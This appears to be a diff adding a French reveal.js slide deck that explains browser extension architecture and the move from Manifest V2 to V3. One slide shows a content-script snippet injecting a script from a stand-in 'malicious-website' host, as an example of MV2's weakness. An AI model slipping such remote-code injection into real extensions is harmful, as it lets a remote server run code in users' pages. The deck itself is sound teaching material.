@@ -1,40 +1,267 @@
-<!doctype html>
+<!DOCTYPE html>
 <html>
-	<head>
-		<meta charset="utf-8">
-		<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
 
-		<title>reveal.js</title>
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
 
-		<link rel="stylesheet" href="dist/reset.css">
-		<link rel="stylesheet" href="dist/reveal.css">
-		<link rel="stylesheet" href="dist/theme/black.css" id="theme">
+  <title>Développer une extension de navigateurs en 2021</title>
 
-		<!-- Theme used for syntax highlighted code -->
-		<link rel="stylesheet" href="plugin/highlight/monokai.css" id="highlight-theme">
-	</head>
-	<body>
-		<div class="reveal">
-			<div class="slides">
-				<section>Slide 1</section>
-				<section>Slide 2</section>
-			</div>
-		</div>
+  <link rel="stylesheet" href="dist/reset.css" />
+  <link rel="stylesheet" href="dist/reveal.css" />
+  <link rel="stylesheet" href="dist/theme/black.css" id="theme" />
 
-		<script src="dist/reveal.js"></script>
-		<script src="plugin/notes/notes.js"></script>
-		<script src="plugin/markdown/markdown.js"></script>
-		<script src="plugin/highlight/highlight.js"></script>
-		<script>
-			// More info about initialization & config:
-			// - https://revealjs.com/initialization/
-			// - https://revealjs.com/config/
-			Reveal.initialize({
-				hash: true,
+  <!-- Theme used for syntax highlighted code -->
+  <link rel="stylesheet" href="plugin/highlight/monokai.css" id="highlight-theme" />
+</head>
 
-				// Learn about plugins: https://revealjs.com/plugins/
-				plugins: [ RevealMarkdown, RevealHighlight, RevealNotes ]
-			});
-		</script>
-	</body>
+<body>
+  <div class="reveal">
+    <div class="slides">
+      <section>
+        <h1 class="r-fit-text">Manifest V3</h1>
+        <hr />
+        <h2 class="r-fit-text">Développer une extension de navigateurs en 2021</h2>
+      </section>
+      <section>
+        <section>
+          <h2>Qu'est-ce qu'une extension ?</h2>
+        </section>
+        <section>
+          "Plugin" qui permet d'ajouter des capacités à son navigateur
+        </section>
+        <section>
+          <p>Repose sur des technologies web</p>
+          <p>Composée de HTML, CSS, JS</p>
+        </section>
+        <section>
+          Autorise l'utilisation d'API étendues permettant de modifier le
+          comportement du navigateur, le contenu de la page, bloquer des
+          requêtes...
+        </section>
+      </section>
+      <section>
+        <section>
+          <h2>Architecture</h2>
+          <p>
+            <img src="dist/images/architecture.png" alt="Architecture Web extension" />
+          </p>
+          <aside class="notes">
+            <a
+              href="https://github.com/uncommonhacks/browser-extension-guide/blob/master/extension-architecture.md">Resources</a>
+          </aside>
+        </section>
+
+        <section>
+          <h3>Manifest</h3>
+          <p>permet de configurer son extension, déclarer des permissions</p>
+          <pre><code data-trim data-noescape>
+            {
+              "name": "My extension",
+              "version": "1.0.0",
+              "manifest_version": 3,
+              "permissions": [ "activeTab", "storage" ],
+              "background": {
+                "service_worker": "background.js"
+              }
+            }
+          </code></pre>
+        </section>
+        <section>
+          <h3>Popups, Dev Tools, Options page</h3>
+          <ul>
+            <li>Composants UI d'une extension</li>
+            <li>
+              Accès aux Web Extensions API (comme les background scripts)
+            </li>
+          </ul>
+        </section>
+
+        <section>
+          <h3>Content scripts</h3>
+          <ul>
+            <li>Utilisé pour accéder au contexte de la page web</li>
+            <li>Possibilité de manipuler le contexte de la page web</li>
+            <li>Accès <strong>limité</strong> aux Web Extensions API</li>
+          </ul>
+        </section>
+
+        <section>
+          <h3>Background scripts</h3>
+          <ul>
+            <li>
+              Script d'arrière-plan actif dès lors que l'extension est
+              installée
+            </li>
+            <li>Accès aux Web Extensions API</li>
+            <li>
+              N'a pas accès à la page web (contrairement aux content scripts)
+            </li>
+          </ul>
+        </section>
+        <section>
+          <p>
+            Rôle central des background scripts pour lier les parties de
+            l'extension entre elles
+          </p>
+
+          <img src="dist/images/interaction.png" alt="Interaction parts web extension" />
+        </section>
+      </section>
+      <section>
+        <section>
+          <h2 class="r-fit-text">Manifest V2</h2>
+          <h3 class="r-fit-text">Vulnérable par design</h3>
+        </section>
+        <section>Publié en 2012 par Chrome</section>
+        <section>
+          <p>Supporté actuellement par:</p>
+          <ul>
+            <li>
+              les navigateurs basés sur
+              <span style="color: var(--link-color)">Chromium</span>
+              (Chrome, Opera, Microsoft Edge depuis la version 14)
+            </li>
+            <li>
+              <span style="color: var(--link-color)"> Firefox </span>
+            </li>
+          </ul>
+
+          <aside class="notes">
+            <a
+              href="https://developer.mozilla.org/en-US/docs/Mozilla/Add-ons/WebExtensions/manifest.json#browser_compatibility">Browser
+              compatibility</a>
+          </aside>
+        </section>
+        <section>
+          <p>&lt;all_urls&gt; trop courant</p>
+          <img src="dist/images/all_url.png" width="400" />
+          <pre><code data-noescape data-trim>
+                {
+                  "content_scripts": [{
+                    "matches": ["&lt;all_urls&gt;"],
+                    "js": [
+                      "inject/index.js"
+                    ],
+                  }]
+                }
+              </code></pre>
+        </section>
+        <section>
+          <p>Possibilité d'exécuter du code hébergé à distance (Chrome)</p>
+          <pre><code data-noescape data-trim>
+            // content-script.js
+
+            // this code injects remote code into your web page !
+
+            const el = document.createElement("script");
+            el.src = "https://malicious-website/index.js";
+            el.crossOrigin = "anonymous";
+            document.body.prepend(el);
+          </code></pre>
+        </section>
+
+      </section>
+
+      <section>
+        <section>
+          <h2 class="r-fit-text">Manifest V3</h2>
+          <p class="r-fit-text">
+            ✨
+            "More privacy, performance, security"
+          </p>
+        </section>
+        <section>
+          <p>
+            Sorti sur Chrome mi-janvier 2021
+          </p>
+        </section>
+        <section>
+          <p>
+            Supporté <span style="color: var(--link-color)">uniquement par Chrome</span> pour le moment.
+          </p>
+          <p>Firefox et Edge seront compatibles à terme (partiellement néanmoins, comme pour le MV2)</p>
+        </section>
+
+        <section>
+          <h4>Permissions optionnelles et/ou dynamiques</h4>
+          <pre><code data-trim data-noescape>
+            {
+              "name": "My Extension",
+              "version": "1.0.0"
+              "permissions": [
+                "activeTab"
+              ],
+              "manifest_version": 3
+            }
+          </code></pre>
+        </section>
+        <section>
+          <h4>Remplacement de Web Request API par Declarative Net Request API</h4>
+          <ul>
+            <li>
+              Permet de modifier ou bloquer les requêtes sans accéder aux données de l'application visitée
+            </li>
+            <li>
+              Approche déclarative (limitante)
+            </li>
+          </ul>
+          <pre><code data-noescape data-trim>
+            [{
+                "id": 1,
+                "priority": 1,
+                "action": { "type": "block" },
+                "condition": {
+                  "urlFilter": "analytics.js",
+                  "resourceTypes": ["script"]
+                }
+            }]
+          </code></pre>
+        </section>
+
+        <section>
+          <h4>Impossibilité d'exécuter du code hébergé sur un serveur distant</h4>
+          <p>Nécessité de packager ses dépendances pour la publication de son extension</p>
+        </section>
+        <section>
+          <h4>Remplacement des background scripts par des services workers</h4>
+          <ul>
+            <li>Exécution plus éphémère que les background scripts (gain performance)</li>
+            <li>Event-based thinking</li>
+          </ul>
+        </section>
+        <section>
+          <img src="dist/images/architecture_mv3.png" alt="architecture web extension with manifest v3">
+        </section>
+      </section>
+
+      <section>
+        <h3>Conclusion</h3>
+        <li class="fragment">Bénéfice intéressant pour l'utilisateur (securité de la navigation, protection des
+          données) 👍</li>
+        <li class="fragment">Plateforme instable. Manifeste très récent, encore à l'état d'ébauche 🤯</li>
+        <li class="fragment">Limitations des possibilités pour les développeurs d'extension ❓</li>
+      </section>
+
+
+    </div>
+  </div>
+
+  <script src="dist/reveal.js"></script>
+  <script src="plugin/notes/notes.js"></script>
+  <script src="plugin/markdown/markdown.js"></script>
+  <script src="plugin/highlight/highlight.js"></script>
+  <script>
+    // More info about initialization & config:
+    // - https://revealjs.com/initialization/
+    // - https://revealjs.com/config/
+    Reveal.initialize({
+      hash: true,
+
+      // Learn about plugins: https://revealjs.com/plugins/
+      plugins: [RevealMarkdown, RevealHighlight, RevealNotes],
+    });
+  </script>
+</body>
+
 </html>
